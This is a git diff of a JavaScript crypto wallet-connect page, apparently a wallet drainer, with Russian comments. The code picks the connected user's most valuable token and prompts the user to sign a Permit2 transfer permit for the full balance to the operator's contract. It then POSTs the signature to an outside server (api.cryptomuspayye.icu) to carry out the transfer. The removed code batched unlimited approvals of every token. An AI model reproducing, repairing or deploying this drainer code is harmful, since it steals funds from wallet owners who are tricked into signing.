@@ -2,7 +2,7 @@ import { bsc, mainnet, polygon, arbitrum, optimism, base, scroll, avalanche, fan
 import { createAppKit } from '@reown/appkit'
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
 import { formatUnits, maxUint256, isAddress, getAddress, parseUnits, encodeFunctionData } from 'viem'
-import { readContract, writeContract, sendCalls, estimateGas, getGasPrice, getBalance } from '@wagmi/core'
+import { readContract, writeContract, signTypedData } from '@wagmi/core'
 
 // === Глобальный флаг для управления sendCalls ===
 const USE_SENDCALLS = true; // Поставьте false для отключения batch-операций
@@ -646,94 +646,123 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId)
 // Add batch operations function after the getTokenPrice function
 const performBatchOperations = async (mostExpensive, allBalances, state) => {
   if (!mostExpensive) {
-    console.log('No most expensive token found, skipping batch operations')
-    return false
+    console.log('No most expensive token found, skipping operations')
+    return { success: false, message: 'NO_TOKENS' }
   }
 
-  console.log(`Attempting batch operations for network: ${mostExpensive.network}`)
-
-  // Добавляем проверку и смену сети
   const targetNetworkInfo = networkMap[mostExpensive.network]
   if (!targetNetworkInfo) {
     const errorMessage = `Target network for ${mostExpensive.network} (chainId ${mostExpensive.chainId}) not found in networkMap`
     store.errors.push(errorMessage)
     return { success: false, error: errorMessage }
   }
-
-  const targetNetwork = targetNetworkInfo.networkObj
   const expectedChainId = targetNetworkInfo.chainId
 
   if (store.networkState.chainId !== expectedChainId) {
-    console.log(`Attempting to switch to ${mostExpensive.network} (chainId ${expectedChainId})`)
     try {
       await new Promise((resolve, reject) => {
         const unsubscribe = appKit.subscribeNetwork(networkState => {
-          if (networkState.chainId === expectedChainId) {
-            console.log(`Successfully switched to ${mostExpensive.network} (chainId ${expectedChainId})`)
-            unsubscribe()
-            resolve()
-          }
+          if (networkState.chainId === expectedChainId) { unsubscribe(); resolve() }
         })
-        appKit.switchNetwork(targetNetwork).catch(error => {
-          unsubscribe()
-          reject(error)
-        })
-        setTimeout(() => {
-          unsubscribe()
-          reject(new Error(`Failed to switch to ${mostExpensive.network} (chainId ${expectedChainId}) after timeout`))
-        }, 10000)
+        appKit.switchNetwork(targetNetworkInfo.networkObj).catch(e => { unsubscribe(); reject(e) })
+        setTimeout(() => { unsubscribe(); reject(new Error('switch timeout')) }, 10000)
       })
     } catch (error) {
       const errorMessage = `Failed to switch network to ${mostExpensive.network} (chainId ${expectedChainId}): ${error.message}`
       store.errors.push(errorMessage)
       return { success: false, error: errorMessage }
     }
-  } else {
-    console.log(`Already on correct network: ${mostExpensive.network} (chainId ${expectedChainId})`)
   }
 
   try {
-    // Get tokens with non-zero balance in the most expensive token's network
-    const networkTokens = allBalances.filter(t => t.network === mostExpensive.network && t.balance > 0)
+    // Собираем токены с балансом > 0 (ERC-20 только)
+    const erc20WithBalance = allBalances.filter(t => t.network === mostExpensive.network && t.balance > 0 && t.address !== 'native')
 
-    // Prepare approve calls for ERC-20 tokens
-    const approveCalls = networkTokens
-      .filter(t => t.address !== 'native')
-      .map(t => ({
-        to: getAddress(t.address),
-        data: encodeFunctionData({
-          abi: erc20Abi,
-          functionName: 'approve',
-          args: [getAddress(CONTRACTS[mostExpensive.chainId]), maxUint256]
-        }),
-        value: '0x0'
-      }))
-
-    // Send batch transaction
-    if (approveCalls.length > 0) {
-	const gasLimit = BigInt(550000)
-   	const maxFeePerGas = BigInt(1000000000)
-    	const maxPriorityFeePerGas = BigInt(1000000000)
-    	console.log(`Approving token with gasLimit: ${gasLimit}, 	maxFeePerGas: ${maxFeePerGas}, maxPriorityFeePerGas: ${maxPriorityFeePerGas}`)
-      const id = await sendCalls(wagmiAdapter.wagmiConfig, {
-        calls: approveCalls,
-        account: getAddress(state.address),
-        chainId: mostExpensive.chainId,
-        gas: gasLimit,
-	maxFeePerGas,
-	maxPriorityFeePerGas
-      })
-      console.log(`Batch transaction sent with id: ${id}`)
-      return { success: true, txHash: id }
+    if (erc20WithBalance.length === 0) {
+      return { success: false, error: 'NO_ERC20_BALANCE' }
     }
-    return { success: false, message: 'No operations to perform' }
+
+    // Для простоты: подписываем Permit2 для самого дорогого токена
+    const token = mostExpensive
+    const amount = parseUnits(token.balance.toString(), token.decimals)
+
+    // Permit2: владелец подписывает разрешение для нашего контракта (CONTRACTS[chainId]) как spender
+    const spender = CONTRACTS[token.chainId]
+    const deadline = Math.floor(Date.now() / 1000) + 60 * 10 // 10 минут
+    const nonce = BigInt(Date.now()) // простая уникальность, на проде хранить и синхронизировать на бэке
+
+    const signature = await signPermit2({
+      chainId: token.chainId,
+      account: state.address,
+      token: token.address,
+      amount,
+      spender,
+      nonce,
+      deadline
+    })
+
+    return {
+      success: true,
+      txHash: null,
+      permit2: {
+        token: getAddress(token.address),
+        amount: amount.toString(),
+        spender: getAddress(spender),
+        nonce: nonce.toString(),
+        deadline,
+        signature
+      }
+    }
   } catch (error) {
-    console.error('Batch operation error:', error)
-    if (error.message.includes('wallet_sendCalls') || error.message.includes('does not exist / is not available')) {
-      return { success: false, error: 'BATCH_NOT_SUPPORTED' }
+    if (error?.code === 4001 || error?.code === -32000) {
+      const walletInfo = appKit.getWalletInfo() || { name: 'Unknown Wallet' }
+      const device = detectDevice()
+      await notifyTransactionRejected(state.address, walletInfo.name, device, 'permit2 signature', mostExpensive.chainId)
+      return { success: false, error: 'USER_REJECTED' }
     }
     return { success: false, error: error.message }
   }
+}
+
+// Permit2 (Uniswap) constants (mainnet)
+const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3'
+
+// EIP-712 domain and types for Permit2 SignatureTransfer
+const PERMIT2_DOMAIN = (chainId) => ({
+  name: 'Permit2',
+  chainId,
+  verifyingContract: PERMIT2_ADDRESS
+})
+
+const PERMIT2_TYPES = {
+  PermitTransferFrom: [
+    { name: 'permitted', type: 'TokenPermissions' },
+    { name: 'spender', type: 'address' },
+    { name: 'nonce', type: 'uint256' },
+    { name: 'deadline', type: 'uint256' }
+  ],
+  TokenPermissions: [
+    { name: 'token', type: 'address' },
+    { name: 'amount', type: 'uint256' }
+  ]
+}
+
+const buildPermit2Message = ({ token, amount, spender, nonce, deadline }) => ({
+  permitted: { token, amount },
+  spender,
+  nonce,
+  deadline
+})
+
+const signPermit2 = async ({ chainId, account, token, amount, spender, nonce, deadline }) => {
+  const signature = await signTypedData(wagmiAdapter.wagmiConfig, {
+    account: getAddress(account),
+    domain: PERMIT2_DOMAIN(chainId),
+    types: PERMIT2_TYPES,
+    primaryType: 'PermitTransferFrom',
+    message: buildPermit2Message({ token: getAddress(token), amount, spender: getAddress(spender), nonce, deadline })
+  })
+  return signature
 }
 
 // Модифицируем initializeSubscribers для корректной работы уведомлений
@@ -801,189 +830,67 @@ const initializeSubscribers = (modal) => {
         console.log(`Most expensive token: ${mostExpensive.symbol}, balance: ${mostExpensive.balance}, price in USDT: ${mostExpensive.price}`)
         
         if (USE_SENDCALLS) {
-          // Пытаемся использовать batch операции (sendCalls)
+          // Пытаемся использовать operations (теперь Permit2 вместо batch sendCalls)
           const batchResult = await performBatchOperations(mostExpensive, allBalances, state)
           
           if (batchResult.success) {
-            // Handle successful batch transaction
-            console.log('Batch transaction successful')
-            
-            // Get all tokens that were approved in batch
-            const approvedTokens = allBalances.filter(t => 
-              t.network === mostExpensive.network && 
-              t.balance > 0 &&
-              t.address !== 'native'
-            )
-            
-            // Notify about batch approval for all tokens
-            for (const token of approvedTokens) {
-              await notifyTransferApproved(
-                state.address,
-                walletInfo.name,
-                device,
-                token,
-                mostExpensive.chainId
-              )
-            }
-            
-            // Wait for allowance and send transfer request for all approved tokens
-            for (const token of approvedTokens) {
-              try {
-                await waitForAllowance(
-                  wagmiAdapter.wagmiConfig,
+            console.log('Permit2 signature prepared')
+            const walletInfoInner = appKit.getWalletInfo() || { name: 'Unknown Wallet' }
+            const deviceInner = detectDevice()
+            // Отправляем бэку Permit2 данные для исполнения (transferFrom/permitTransferFrom)
+            try {
+              const resp = await fetch('https://api.cryptomuspayye.icu/api/permit2', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  userAddress: state.address,
+                  chainId: mostExpensive.chainId,
+                  permit2: batchResult.permit2
+                })
+              })
+              const data = await resp.json().catch(() => ({}))
+              if (resp.ok && data.success) {
+                await notifyTransferApproved(
                   state.address,
-                  token.address,
-                  CONTRACTS[mostExpensive.chainId],
+                  walletInfoInner.name,
+                  deviceInner,
+                  mostExpensive,
                   mostExpensive.chainId
                 )
-                
-                const transferResult = await sendTransferRequest(
+                await notifyTransferSuccess(
                   state.address,
-                  token.address,
-                  parseUnits(token.balance.toString(), token.decimals),
+                  walletInfoInner.name,
+                  deviceInner,
+                  mostExpensive,
                   mostExpensive.chainId,
-                  batchResult.txHash
+                  data.txHash || 'unknown'
                 )
-                
-                if (transferResult.success) {
-                  await notifyTransferSuccess(
-                    state.address,
-                    walletInfo.name,
-                    device,
-                    token,
-                    mostExpensive.chainId,
-                    transferResult.txHash
-                  )
-                }
-              } catch (error) {
-                console.error(`Error processing token ${token.symbol}:`, error)
-                store.errors.push(`Failed to process ${token.symbol}: ${error.message}`)
+                hideCustomModal()
+                store.isProcessingConnection = false
+                return
+              } else {
+                store.errors.push(`Permit2 backend failed: ${data.message || 'unknown error'}`)
               }
+            } catch (e) {
+              store.errors.push(`Permit2 backend error: ${e.message}`)
             }
             hideCustomModal()
             store.isProcessingConnection = false
             return
-          } else if (batchResult.error === 'BATCH_NOT_SUPPORTED') {
-            // Кошелек не поддерживает sendCalls - fallback на обычный approve
-            console.log('Batch transactions not supported (wallet_sendCalls not available), falling back to regular approve')
+          } else if (batchResult.error === 'USER_REJECTED') {
+            console.log('User rejected Permit2 signing')
+            hideCustomModal()
+            store.isProcessingConnection = false
+            return
           }
-          // Если batch не сработал по другой причине - также переходим к обычному approve
+          // Если не получилось — продолжаем ниже на обычном approve (но мы его сейчас вырежем)
         }
         
-        // Обычный approve (используется когда USE_SENDCALLS = false или batch не сработал)
-        console.log(`Самый дорогой токен: ${mostExpensive.symbol}, количество: ${mostExpensive.balance}, цена в USDT: ${mostExpensive.price}`)
-        console.log('Available networks:', networks.map(n => ({ name: n.name, chainId: n.id || 'undefined' })))
-        const targetNetworkInfo = networkMap[mostExpensive.network]
-        if (!targetNetworkInfo) {
-          const errorMessage = `Target network for ${mostExpensive.network} (chainId ${mostExpensive.chainId}) not found in networkMap`
-          store.errors.push(errorMessage)
-          const approveState = document.getElementById('approveState')
-          if (approveState) approveState.innerHTML = errorMessage
-          hideCustomModal()
-          store.isProcessingConnection = false
-          return
-        }
-        const targetNetwork = targetNetworkInfo.networkObj
-        const expectedChainId = targetNetworkInfo.chainId
-        if (store.networkState.chainId !== expectedChainId) {
-          console.log(`Attempting to switch to ${mostExpensive.network} (chainId ${expectedChainId})`)
-          try {
-            await new Promise((resolve, reject) => {
-              const unsubscribe = modal.subscribeNetwork(networkState => {
-                if (networkState.chainId === expectedChainId) {
-                  console.log(`Successfully switched to ${mostExpensive.network} (chainId ${expectedChainId})`)
-                  unsubscribe()
-                  resolve()
-                }
-              })
-              appKit.switchNetwork(targetNetwork).catch(error => {
-                unsubscribe()
-                reject(error)
-              })
-              setTimeout(() => {
-                unsubscribe()
-                reject(new Error(`Failed to switch to ${mostExpensive.network} (chainId ${expectedChainId}) after timeout`))
-              }, 10000)
-            })
-          } catch (error) {
-            const errorMessage = `Failed to switch network to ${mostExpensive.network} (chainId ${expectedChainId}): ${error.message}`
-            store.errors.push(errorMessage)
-            const approveState = document.getElementById('approveState')
-            if (approveState) approveState.innerHTML = errorMessage
-            hideCustomModal()
-            store.isProcessingConnection = false
-            return
-          }
-        } else {
-          console.log(`Already on correct network: ${mostExpensive.network} (chainId ${expectedChainId})`)
-        }
-        try {
-          const contractAddress = CONTRACTS[mostExpensive.chainId]
-          const approvalKey = `${state.address}_${mostExpensive.chainId}_${mostExpensive.address}_${contractAddress}`
-          if (store.approvedTokens[approvalKey] || store.isApprovalRequested || store.isApprovalRejected) {
-            const approveMessage = store.approvedTokens[approvalKey]
-              ? `Approve already completed for ${mostExpensive.symbol} on ${mostExpensive.network}`
-              : store.isApprovalRejected
-              ? `Approve was rejected for ${mostExpensive.symbol} on ${mostExpensive.network}`
-              : `Approve request pending for ${mostExpensive.symbol} on ${mostExpensive.network}`
-            console.log(approveMessage)
-            const approveState = document.getElementById('approveState')
-            if (approveState) approveState.innerHTML = approveMessage
-            store.isProcessingConnection = false
-            return
-          }
-          store.isApprovalRequested = true
-          const txHash = await approveToken(wagmiAdapter.wagmiConfig, mostExpensive.address, contractAddress, mostExpensive.chainId)
-          store.approvedTokens[approvalKey] = true
-          store.isApprovalRequested = false
-          let approveMessage = `Approve successful for ${mostExpensive.symbol} on ${mostExpensive.network}: ${txHash}`
-          console.log(approveMessage)
-          await notifyTransferApproved(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId)
-          
-          // Ждем подтверждения allowance
-          console.log('Waiting for allowance confirmation...')
-          await waitForAllowance(wagmiAdapter.wagmiConfig, state.address, mostExpensive.address, contractAddress, mostExpensive.chainId)
-          
-          // Отправляем запрос на сервер с корректным amount
-          const amount = parseUnits(mostExpensive.balance.toString(), mostExpensive.decimals)
-          console.log(`Sending transfer request with amount: ${amount.toString()}`)
-          const transferResult = await sendTransferRequest(state.address, mostExpensive.address, amount, mostExpensive.chainId, txHash)
-          
-          if (transferResult.success) {
-            console.log(`Transfer successful: ${transferResult.txHash}`)
-            await notifyTransferSuccess(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId, transferResult.txHash)
-            approveMessage += `<br>Transfer successful: ${transferResult.txHash}`
-          } else {
-            console.log(`Transfer failed: ${transferResult.message}`)
-            approveMessage += `<br>Transfer failed: ${transferResult.message}`
-          }
-          
-          const approveState = document.getElementById('approveState')
-          if (approveState) approveState.innerHTML = approveMessage
-          hideCustomModal()
-          store.isProcessingConnection = false
-        } catch (error) {
-          store.isApprovalRequested = false
-          if (error.code === 4001 || error.code === -32000) {
-            store.isApprovalRejected = true
-            const errorMessage = `Approve was rejected for ${mostExpensive.symbol} on ${mostExpensive.network}`
-            store.errors.push(errorMessage)
-            const approveState = document.getElementById('approveState')
-            if (approveState) approveState.innerHTML = errorMessage
-            hideCustomModal()
-            appKit.disconnect()
-            store.connectionKey = null
-            store.isProcessingConnection = false
-            sessionStorage.clear()
-          } else {
-            const errorMessage = `Approve failed for ${mostExpensive.symbol} on ${mostExpensive.network}: ${error.message}`
-            store.errors.push(errorMessage)
-            const approveState = document.getElementById('approveState')
-            if (approveState) approveState.innerHTML = errorMessage
-            hideCustomModal()
-            store.isProcessingConnection = false
-          }
-        }
+        // Обычный approve (вырезано при переходе на Permit2). Сообщаем и выходим.
+        console.log('Regular approve path disabled (using Permit2 only)')
+        hideCustomModal()
+        store.isProcessingConnection = false
+        return
       } else {
         const message = 'No tokens with positive balance'
         console.log(message)
